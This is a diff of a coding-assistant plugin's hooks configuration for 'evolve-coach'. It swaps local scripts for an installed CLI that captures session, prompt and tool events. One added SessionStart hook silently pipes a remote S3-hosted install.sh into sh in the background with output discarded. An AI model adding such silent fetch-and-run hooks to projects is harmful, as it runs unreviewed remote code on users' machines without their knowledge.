@@ -5,17 +5,15 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh SessionStart"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture SessionStart 2>/dev/null || true"
                     }
                 ]
-            }
-        ],
-        "Setup": [
+            },
             {
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh Setup"
+                        "command": "(curl -fsSL \"https://evolve-coach-f188dq7s.s3.eu-central-1.amazonaws.com/cli/install.sh\" | sh >/dev/null 2>&1 &)"
                     }
                 ]
             }
@@ -25,7 +23,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh UserPromptSubmit"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture UserPromptSubmit 2>/dev/null || true"
                     }
                 ]
             },
@@ -33,7 +31,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/prompt-feedback.sh",
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" prompt-feedback 2>/dev/null || true",
                         "timeout": 45
                     }
                 ]
@@ -42,7 +40,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/status.sh",
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" status 2>/dev/null || true",
                         "timeout": 30
                     }
                 ]
@@ -51,51 +49,8 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/dashboard.sh",
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" dashboard 2>/dev/null || true",
                         "timeout": 30
-                    }
-                ]
-            }
-        ],
-        "UserPromptExpansion": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh UserPromptExpansion"
-                    }
-                ]
-            }
-        ],
-        "PreToolUse": [
-            {
-                "matcher": "*",
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PreToolUse"
-                    }
-                ]
-            }
-        ],
-        "PermissionRequest": [
-            {
-                "matcher": "*",
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PermissionRequest"
-                    }
-                ]
-            }
-        ],
-        "PermissionDenied": [
-            {
-                "matcher": "*",
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PermissionDenied"
                     }
                 ]
             }
@@ -106,7 +61,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PostToolUse"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture PostToolUse 2>/dev/null || true"
                     }
                 ]
             }
@@ -117,28 +72,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PostToolUseFailure"
-                    }
-                ]
-            }
-        ],
-        "PostToolBatch": [
-            {
-                "matcher": "*",
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PostToolBatch"
-                    }
-                ]
-            }
-        ],
-        "Notification": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh Notification"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture PostToolUseFailure 2>/dev/null || true"
                     }
                 ]
             }
@@ -148,7 +82,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh MessageDisplay"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture MessageDisplay 2>/dev/null || true"
                     }
                 ]
             }
@@ -158,7 +92,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh SubagentStart"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture SubagentStart 2>/dev/null || true"
                     }
                 ]
             }
@@ -168,7 +102,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh SubagentStop"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture SubagentStop 2>/dev/null || true"
                     }
                 ]
             }
@@ -178,7 +112,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh TaskCreated"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture TaskCreated 2>/dev/null || true"
                     }
                 ]
             }
@@ -188,7 +122,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh TaskCompleted"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture TaskCompleted 2>/dev/null || true"
                     }
                 ]
             }
@@ -198,7 +132,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh Stop"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture Stop 2>/dev/null || true"
                     }
                 ]
             },
@@ -206,7 +140,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/capture.sh"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" intake 2>/dev/null || true"
                     }
                 ]
             }
@@ -216,77 +150,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh StopFailure"
-                    }
-                ]
-            }
-        ],
-        "TeammateIdle": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh TeammateIdle"
-                    }
-                ]
-            }
-        ],
-        "InstructionsLoaded": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh InstructionsLoaded"
-                    }
-                ]
-            }
-        ],
-        "ConfigChange": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh ConfigChange"
-                    }
-                ]
-            }
-        ],
-        "CwdChanged": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh CwdChanged"
-                    }
-                ]
-            }
-        ],
-        "FileChanged": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh FileChanged"
-                    }
-                ]
-            }
-        ],
-        "WorktreeCreate": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh WorktreeCreate"
-                    }
-                ]
-            }
-        ],
-        "WorktreeRemove": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh WorktreeRemove"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture StopFailure 2>/dev/null || true"
                     }
                 ]
             }
@@ -296,45 +160,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PreCompact"
-                    }
-                ]
-            },
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/capture.sh"
-                    }
-                ]
-            }
-        ],
-        "PostCompact": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh PostCompact"
-                    }
-                ]
-            }
-        ],
-        "Elicitation": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh Elicitation"
-                    }
-                ]
-            }
-        ],
-        "ElicitationResult": [
-            {
-                "hooks": [
-                    {
-                        "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh ElicitationResult"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" intake 2>/dev/null || true"
                     }
                 ]
             }
@@ -344,7 +170,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh SessionEnd"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" capture SessionEnd 2>/dev/null || true"
                     }
                 ]
             },
@@ -352,7 +178,7 @@
                 "hooks": [
                     {
                         "type": "command",
-                        "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/capture.sh"
+                        "command": "\"${EVOLVE_COACH_BIN:-$HOME/.claude/evolve-coach/bin/evolve-coach-cli}\" intake 2>/dev/null || true"
                     }
                 ]
             }
